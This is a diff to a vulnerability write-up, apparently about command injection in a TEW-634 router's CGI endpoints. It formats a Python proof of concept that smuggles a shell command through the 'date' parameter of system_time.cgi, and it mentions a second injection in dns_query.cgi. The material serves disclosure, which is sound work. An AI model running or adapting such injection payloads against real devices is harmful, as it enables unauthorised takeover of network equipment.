@@ -14,6 +14,7 @@ The first command injection occurred in the "date" parameter of http://ip/system
 ![image](https://github.com/WhereisRain/TEW-634/blob/main/date.png)
 
 # poc1
+```
 import requests
 
 ip = "http://192.168.10.1/"
@@ -22,18 +23,18 @@ url = ip + 'system_time.cgi'
 
 command = "20250523; echo 1 > /tmp/hello1"
 
-payload = \{
+payload = {
     "date": command,
     
     "html_response_return_page": "static_routing.asp",
-\}
+}
 
 r = requests.post(url, data=payload)
 
 print(r.headers)
 
 print(r.text)
-
+```
 # dns_query.cgi
 The second command injection occurred in the "dns_query_name" parameter of http://ip/dns_query.cgi, as shown in the following figure.
 
